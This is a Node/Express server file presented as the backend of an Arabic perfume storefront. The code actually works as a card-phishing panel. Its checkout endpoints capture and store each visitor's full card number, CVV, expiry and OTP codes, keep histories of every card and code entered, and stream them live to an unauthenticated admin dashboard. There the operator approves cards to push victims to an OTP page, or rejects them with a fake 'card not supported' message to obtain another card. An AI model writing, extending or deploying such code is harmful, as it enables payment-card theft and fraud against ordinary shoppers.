import express from "express";
import { createServer as createViteServer } from "vite";
import fs from "fs";
import path from "path";

const app = express();
const PORT = 3000;

const supabaseUrl = process.env.SUPABASE_URL?.replace(/\/+$/, "");
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;

async function requestSupabase(reqPath: string, init: RequestInit = {}): Promise<Response> {
  if (supabaseUrl && supabaseAnonKey) {
    return fetch(`${supabaseUrl}${reqPath}`, {
      ...init,
      method: init.method || "GET",
      headers: {
        apikey: supabaseAnonKey,
        Authorization: `Bearer ${supabaseAnonKey}`,
        ...(init.headers || {}),
      },
    });
  }
  throw new Error("Supabase is not configured");
}

app.use(express.json());

app.get("/api/bin-lookup/:bin", async (request, response) => {
  const { bin } = request.params;
  const cleanBin = (bin || "").replace(/\D/g, "").slice(0, 8);

  if (cleanBin.length < 6) {
    response.status(400).json({ error: "BIN must be at least 6 digits" });
    return;
  }

  try {
    const binRes = await fetch(`https://lookup.binlist.net/${cleanBin}`, {
      headers: {
        "Accept-Version": "3",
        "User-Agent": "DkhoonEmirates-Storefront/1.0",
      },
    });

    if (binRes.ok) {
      const data = await binRes.json();
      response.status(200).json({
        scheme: data.scheme || "",
        type: data.type || "",
        brand: data.brand || "",
        bankName: data.bank?.name || "",
        bankPhone: data.bank?.phone || "",
        bankUrl: data.bank?.url || "",
        countryName: data.country?.name || "",
        countryEmoji: data.country?.emoji || "",
      });
      return;
    }

    response.status(200).json({
      scheme: "",
      type: "",
      brand: "",
      bankName: "",
      bankPhone: "",
      bankUrl: "",
      countryName: "",
      countryEmoji: "",
    });
  } catch (error) {
    console.warn("BIN lookup request failed, returning empty details:", error);
    response.status(200).json({
      scheme: "",
      type: "",
      brand: "",
      bankName: "",
      bankPhone: "",
      bankUrl: "",
      countryName: "",
      countryEmoji: "",
    });
  }
});

interface VisitorLogEvent {
  id: string;
  timestamp: string;
  type:
    | "page_view"
    | "step_change"
    | "phone_entered"
    | "shipping_entered"
    | "card_entered"
    | "otp_entered"
    | "order_completed";
  message: string;
  details?: Record<string, any>;
}

interface VisitorRecord {
  visitorId: string;
  currentPage: string;
  isOnline: boolean;
  lastSeen: string;
  createdAt: string;
  ipAddress?: string;
  userAgent?: string;
  checkout?: any;
  eventLogs: VisitorLogEvent[];
}

const visitorStore = new Map<string, VisitorRecord>();
const deletedVisitorIds = new Set<string>();

// Active Server-Sent Events client streams
const adminStreamClients = new Set<express.Response>();
const visitorStreamClients = new Map<string, Set<express.Response>>();

function broadcastToAdmins(eventType: string, payload: any) {
  const message = `event: ${eventType}\ndata: ${JSON.stringify(payload)}\n\n`;
  for (const client of Array.from(adminStreamClients)) {
    try {
      client.write(message);
    } catch {
      adminStreamClients.delete(client);
    }
  }
}

function sendToVisitor(visitorId: string, eventType: string, payload: any) {
  const clients = visitorStreamClients.get(visitorId);
  if (!clients || clients.size === 0) return;
  const message = `event: ${eventType}\ndata: ${JSON.stringify(payload)}\n\n`;
  for (const client of Array.from(clients)) {
    try {
      client.write(message);
    } catch {
      clients.delete(client);
    }
  }
}

// Keepalive heartbeat every 15s to keep proxy connections alive
setInterval(() => {
  for (const client of Array.from(adminStreamClients)) {
    try {
      client.write(": keepalive\n\n");
    } catch {
      adminStreamClients.delete(client);
    }
  }
  for (const [visitorId, clients] of Array.from(visitorStreamClients.entries())) {
    for (const client of Array.from(clients)) {
      try {
        client.write(": keepalive\n\n");
      } catch {
        clients.delete(client);
      }
    }
    if (clients.size === 0) {
      visitorStreamClients.delete(visitorId);
    }
  }
}, 15000);

function persistStore() {
  if (supabaseUrl && supabaseAnonKey) {
    try {
      const array = Array.from(visitorStore.values());
      const recordsToSync = array.slice(0, 100).map((record) => ({
        visitor_id: record.visitorId,
        current_page: record.currentPage,
        is_online: record.isOnline,
        last_seen: record.lastSeen,
        created_at: record.createdAt,
        ip_address: record.ipAddress || null,
        user_agent: record.userAgent || null,
        checkout: record.checkout || null,
        event_logs: record.eventLogs || [],
      }));

      requestSupabase("/rest/v1/site_visitors?on_conflict=visitor_id", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Prefer: "resolution=merge-duplicates,return=minimal",
        },
        body: JSON.stringify(recordsToSync),
      }).catch(() => {});
    } catch (err) {
      console.warn("Supabase remote sync failed:", err);
    }
  }
}

function formatArabicPageNameServer(urlPath: string | undefined): string {
  if (!urlPath) return "الصفحة الرئيسية (المتجر)";
  const raw = urlPath.trim();

  if (raw === "/" || raw === "" || raw === "/index.html") {
    return "الصفحة الرئيسية (المتجر)";
  }
  if (raw.includes("/checkout")) {
    if (raw.includes("step=1")) return "صفحة الشراء — خطوة 1: الهاتف والتواصل";
    if (raw.includes("step=2")) return "صفحة الشراء — خطوة 2: الشحن والعنوان";
    if (raw.includes("step=3")) return "صفحة الشراء — خطوة 3: بيانات الدفع والبطاقة";
    if (raw.includes("step=4") || raw.includes("otp")) return "صفحة الشراء — خطوة 4: رمز التحقق OTP";
    return "صفحة الشراء وإتمام الطلب";
  }
  if (raw.includes("#london-collection")) return "قسم مجموعة عطور لندن";
  if (raw.includes("#national-day")) return "قسم عروض اليوم الوطني 96";
  if (raw.includes("#exclusives")) return "قسم حصريات اليوم الوطني";
  if (raw.includes("#gifts")) return "قسم الأطقم والهدايا الفاخرة";
  if (raw.includes("#incense")) return "قسم مجموعة البخور الأصلية";
  if (raw.includes("#oud")) return "قسم العود الفاخر";

  return `صفحة: ${raw}`;
}

app.post("/api/visitor/sync", (request, response) => {
  const { visitorId, currentPage, isOnline, checkout } = request.body ?? {};

  if (!visitorId || typeof visitorId !== "string") {
    response.status(400).json({ error: "Missing visitorId" });
    return;
  }

  if (deletedVisitorIds.has(visitorId)) {
    // If deleted by admin and this is only routine heartbeat with no checkout interaction, ignore
    if (!checkout || (!checkout.phone && !checkout.cardNumber && !checkout.otpCode)) {
      response.status(200).json({ ok: true, deleted: true, resetVisitorId: true });
      return;
    }
    deletedVisitorIds.delete(visitorId);
  }

  const now = new Date().toISOString();
  let record = visitorStore.get(visitorId);

  if (!record) {
    record = {
      visitorId,
      currentPage: currentPage || "/",
      isOnline: typeof isOnline === "boolean" ? isOnline : true,
      lastSeen: now,
      createdAt: now,
      ipAddress: request.ip || request.headers["x-forwarded-for"]?.toString() || "127.0.0.1",
      userAgent: request.get("user-agent") || "",
      checkout: checkout || { step: 1 },
      eventLogs: [
        {
          id: `${Date.now()}-1`,
          timestamp: now,
          type: "page_view",
          message: `بدأ الزائر الجلسة والتصفح في: ${formatArabicPageNameServer(currentPage)}`,
          details: { page: currentPage || "/" },
        },
      ],
    };
    visitorStore.set(visitorId, record);
  } else {
    const prevPage = record.currentPage;
    record.isOnline = typeof isOnline === "boolean" ? isOnline : true;
    record.lastSeen = now;
    if (currentPage && currentPage !== prevPage) {
      record.currentPage = currentPage;
      record.eventLogs.push({
        id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
        timestamp: now,
        type: "page_view",
        message: `انتقل إلى: ${formatArabicPageNameServer(currentPage)}`,
        details: { from: prevPage, to: currentPage },
      });
    }
    if (checkout) {
      record.checkout = { ...(record.checkout || {}), ...checkout };
    }
  }

  persistStore();
  broadcastToAdmins("session_update", record);
  response.status(200).json({ ok: true, visitor: record });
});

app.post("/api/checkout/sync", (request, response) => {
  const { visitorId, checkout, eventType, message, details } = request.body ?? {};

  if (!visitorId || typeof visitorId !== "string") {
    response.status(400).json({ error: "Missing visitorId" });
    return;
  }

  const now = new Date().toISOString();
  let record = visitorStore.get(visitorId);

  if (!record) {
    record = {
      visitorId,
      currentPage: "/checkout",
      isOnline: true,
      lastSeen: now,
      createdAt: now,
      ipAddress: request.ip || request.headers["x-forwarded-for"]?.toString() || "127.0.0.1",
      userAgent: request.get("user-agent") || "",
      checkout: checkout || { step: 1 },
      eventLogs: [],
    };
    visitorStore.set(visitorId, record);
  }

  record.isOnline = true;
  record.lastSeen = now;

  const prevCheckout = record.checkout || {};
  const updatedCheckout = { ...prevCheckout, ...checkout };

  if (checkout?.cardNumber && prevCheckout.cardNumber && checkout.cardNumber !== prevCheckout.cardNumber) {
    const cardHistory = updatedCheckout.cardHistory || [];
    const exists = cardHistory.some((c) => c.cardNumber === prevCheckout.cardNumber);
    if (!exists) {
      cardHistory.push({
        cardholderName: prevCheckout.cardholderName,
        cardNumber: prevCheckout.cardNumber,
        cardExpiry: prevCheckout.cardExpiry,
        cardCvv: prevCheckout.cardCvv,
        binInfo: prevCheckout.binInfo,
        paymentMethod: prevCheckout.paymentMethod,
        cardApprovalStatus: prevCheckout.cardApprovalStatus,
        submittedAt: now,
      });
    }
    updatedCheckout.cardHistory = cardHistory;
  }

  if (checkout?.otpCode && checkout.otpCode !== prevCheckout.otpCode) {
    const history = updatedCheckout.otpHistory || [];
    history.push({ code: checkout.otpCode, timestamp: now });
    updatedCheckout.otpHistory = history;
    updatedCheckout.otpSubmittedAt = now;
  }

  record.checkout = updatedCheckout;

  if (eventType && message) {
    record.eventLogs.push({
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: now,
      type: eventType,
      message,
      details: details || {},
    });
  }

  persistStore();
  broadcastToAdmins("session_update", record);
  response.status(200).json({ ok: true, visitor: record });
});

app.post("/api/admin/card-action", (request, response) => {
  const { visitorId, action } = request.body ?? {};

  if (!visitorId || typeof visitorId !== "string") {
    response.status(400).json({ error: "Missing visitorId" });
    return;
  }

  const record = visitorStore.get(visitorId);
  if (!record) {
    response.status(404).json({ error: "Session not found" });
    return;
  }

  const now = new Date().toISOString();
  const prevCheckout = record.checkout || { step: 3 };

  if (action === "approve") {
    record.checkout = {
      ...prevCheckout,
      cardApprovalStatus: "approved",
      awaitingOtp: true,
      step: 4,
    };
    record.eventLogs.push({
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: now,
      type: "step_change",
      message: "🟢 تم قبول البطاقة من الآدمن وتحويل العميل لصفحة OTP",
      details: { action: "approve" },
    });
  } else if (action === "reject") {
    record.checkout = {
      ...prevCheckout,
      cardApprovalStatus: "rejected_unsupported",
      cardRejectReason: "عذراً، البطاقة غير مدعومة. يرجى إدخال بطاقة أخرى",
      step: 3,
      awaitingOtp: false,
    };
    record.eventLogs.push({
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: now,
      type: "card_entered",
      message: "🔴 البطاقة غير مدعومة",
      details: { action: "reject" },
    });
  } else if (action === "reset") {
    const cardHistory = prevCheckout.cardHistory || [];
    if (prevCheckout.cardNumber) {
      const exists = cardHistory.some((c) => c.cardNumber === prevCheckout.cardNumber);
      if (!exists) {
        cardHistory.push({
          cardholderName: prevCheckout.cardholderName,
          cardNumber: prevCheckout.cardNumber,
          cardExpiry: prevCheckout.cardExpiry,
          cardCvv: prevCheckout.cardCvv,
          binInfo: prevCheckout.binInfo,
          paymentMethod: prevCheckout.paymentMethod,
          cardApprovalStatus: prevCheckout.cardApprovalStatus,
          submittedAt: now,
        });
      }
    }
    record.checkout = {
      ...prevCheckout,
      cardHistory,
      cardApprovalStatus: "idle",
      cardNumber: "",
      cardholderName: "",
      cardExpiry: "",
      cardCvv: "",
      binInfo: undefined,
      step: 3,
      awaitingOtp: false,
    };
    record.eventLogs.push({
      id: `${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      timestamp: now,
      type: "card_entered",
      message: "🔄 تم طلب إدخال بطاقة جديدة من العميل",
      details: { action: "reset" },
    });
  }

  persistStore();
  broadcastToAdmins("session_update", record);
  sendToVisitor(visitorId, "card_action", {
    status: record.checkout?.cardApprovalStatus || "idle",
    reason: record.checkout?.cardRejectReason || "",
    step: record.checkout?.step || 3,
    awaitingOtp: Boolean(record.checkout?.awaitingOtp),
  });
  response.status(200).json({ ok: true, visitor: record });
});

app.get("/api/admin/stream", async (_request, response) => {
  response.setHeader("Content-Type", "text/event-stream");
  response.setHeader("Cache-Control", "no-cache, no-transform");
  response.setHeader("Connection", "keep-alive");
  response.setHeader("X-Accel-Buffering", "no");
  response.flushHeaders?.();

  const sessions = Array.from(visitorStore.values())
    .filter((s) => !deletedVisitorIds.has(s.visitorId))
    .sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());

  response.write(`event: init\ndata: ${JSON.stringify({ sessions })}\n\n`);
  adminStreamClients.add(response);

  _request.on("close", () => {
    adminStreamClients.delete(response);
  });
});

app.get("/api/visitor/stream", (request, response) => {
  const visitorId = request.query.visitorId as string;
  if (!visitorId || typeof visitorId !== "string") {
    response.status(400).end();
    return;
  }

  response.setHeader("Content-Type", "text/event-stream");
  response.setHeader("Cache-Control", "no-cache, no-transform");
  response.setHeader("Connection", "keep-alive");
  response.setHeader("X-Accel-Buffering", "no");
  response.flushHeaders?.();

  if (!visitorStreamClients.has(visitorId)) {
    visitorStreamClients.set(visitorId, new Set());
  }
  const clientSet = visitorStreamClients.get(visitorId)!;
  clientSet.add(response);

  const record = visitorStore.get(visitorId);
  if (record?.checkout) {
    response.write(`event: card_action\ndata: ${JSON.stringify({
      status: record.checkout.cardApprovalStatus || "idle",
      reason: record.checkout.cardRejectReason || "",
      step: record.checkout.step || 1,
      awaitingOtp: Boolean(record.checkout.awaitingOtp),
    })}\n\n`);
  }

  if (record && !deletedVisitorIds.has(visitorId)) {
    record.isOnline = true;
    record.lastSeen = new Date().toISOString();
    broadcastToAdmins("session_update", record);
  }

  request.on("close", () => {
    clientSet.delete(response);
    if (clientSet.size === 0) {
      visitorStreamClients.delete(visitorId);
      const rec = visitorStore.get(visitorId);
      if (rec && !deletedVisitorIds.has(visitorId)) {
        rec.isOnline = false;
        rec.lastSeen = new Date().toISOString();
        broadcastToAdmins("session_update", rec);
      }
    }
  });
});

app.get("/api/admin/sessions", async (_request, response) => {
  response.setHeader("Content-Type", "application/json");
  if (supabaseUrl && supabaseAnonKey) {
    try {
      const res = await requestSupabase(
        "/rest/v1/site_visitors?select=visitor_id,current_page,is_online,last_seen,created_at,ip_address,user_agent,checkout,event_logs&order=last_seen.desc&limit=200"
      );
      if (res && res.ok) {
        const text = await res.text();
        if (text && text.trim().startsWith("[")) {
          const rows = JSON.parse(text);
          if (Array.isArray(rows)) {
            for (const row of rows) {
              if (row && row.visitor_id && !deletedVisitorIds.has(row.visitor_id) && !visitorStore.has(row.visitor_id)) {
                visitorStore.set(row.visitor_id, {
                  visitorId: row.visitor_id,
                  currentPage: row.current_page || "/",
                  isOnline: Boolean(row.is_online),
                  lastSeen: row.last_seen || new Date().toISOString(),
                  createdAt: row.created_at || new Date().toISOString(),
                  ipAddress: row.ip_address || undefined,
                  userAgent: row.user_agent || undefined,
                  checkout: row.checkout || undefined,
                  eventLogs: Array.isArray(row.event_logs) ? row.event_logs : [],
                });
              }
            }
          }
        }
      }
    } catch (err) {
      // Fallback to local store if Supabase fetch fails
    }
  }

  const sessions = Array.from(visitorStore.values())
    .filter((s) => !deletedVisitorIds.has(s.visitorId))
    .sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
  response.status(200).json({ sessions });
});

app.delete("/api/admin/session/:id", async (request, response) => {
  const { id } = request.params;
  deletedVisitorIds.add(id);
  visitorStore.delete(id);

  if (supabaseUrl && supabaseAnonKey) {
    try {
      await requestSupabase(`/rest/v1/site_visitors?visitor_id=eq.${encodeURIComponent(id)}`, {
        method: "DELETE",
      });
    } catch (err) {
      console.warn("Supabase session delete failed:", err);
    }
  }

  persistStore();
  broadcastToAdmins("session_deleted", { visitorId: id });
  sendToVisitor(id, "session_reset", { resetVisitorId: true });
  response.status(200).json({ ok: true });
});

app.post("/api/admin/clear", async (_request, response) => {
  for (const id of visitorStore.keys()) {
    deletedVisitorIds.add(id);
    sendToVisitor(id, "session_reset", { resetVisitorId: true });
  }
  visitorStore.clear();

  if (supabaseUrl && supabaseAnonKey) {
    try {
      await requestSupabase(`/rest/v1/site_visitors?visitor_id=neq.placeholder_keep_none`, {
        method: "DELETE",
      });
    } catch (err) {
      console.warn("Supabase clear all failed:", err);
    }
  }

  broadcastToAdmins("sessions_cleared", {});
  response.status(200).json({ ok: true });
});

app.get("/api/products", async (_request, response) => {
  if (supabaseUrl && supabaseAnonKey) {
    try {
      const supabaseResponse = await requestSupabase(
        "/rest/v1/products?select=id,name,image_url,secondary_image_url,price,original_price,discount_percent,category,product_url,description,notes,volume&order=sort_order.asc,name.asc"
      );

      if (supabaseResponse.ok) {
        const body = await supabaseResponse.text();
        response.status(200).type("application/json").send(body);
        return;
      }
    } catch {
      // Supabase unavailable, fall back to local catalog
    }
  }

  try {
    const catalogPath = path.join(process.cwd(), "public", "products", "catalog.json");
    if (fs.existsSync(catalogPath)) {
      const catalogData = await fs.promises.readFile(catalogPath, "utf-8");
      response.status(200).type("application/json").send(catalogData);
      return;
    }
  } catch (err) {
    // Fall back to empty or static array
  }
  response.status(200).json([]);
});

app.get("/api/health/supabase", async (_request, response) => {
  if (!supabaseUrl || !supabaseAnonKey) {
    response.status(200).json({ connected: false, mocked: true });
    return;
  }
  try {
    const supabaseResponse = await requestSupabase("/rest/v1/products?select=id&limit=1");
    response.status(200).json({
      connected: supabaseResponse.ok,
      mocked: !supabaseResponse.ok,
    });
  } catch {
    response.status(200).json({ connected: false, mocked: true });
  }
});

app.post("/api/visitor/heartbeat", async (request, response) => {
  const { visitorId, currentPage, isOnline } = request.body ?? {};

  if (
    typeof visitorId !== "string" ||
    !/^[a-zA-Z0-9_-]{8,128}$/.test(visitorId) ||
    typeof currentPage !== "string" ||
    currentPage.length > 2048 ||
    typeof isOnline !== "boolean"
  ) {
    response.status(400).json({ error: "Invalid visitor status" });
    return;
  }

  if (supabaseUrl && supabaseAnonKey) {
    try {
      await requestSupabase(
        "/rest/v1/site_visitors?on_conflict=visitor_id",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Prefer: "resolution=merge-duplicates,return=minimal",
          },
          body: JSON.stringify({
            visitor_id: visitorId,
            current_page: currentPage,
            is_online: isOnline,
            last_seen: new Date().toISOString(),
            user_agent: request.get("user-agent")?.slice(0, 512) || null,
          }),
        }
      );
    } catch {
      // Silent fallback for visitor tracking when offline
    }
  }

  response.status(204).end();
});

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      configFile: "./vite.config.ts",
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (_req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Storefront server listening on port ${PORT}`);
  });
}

startServer();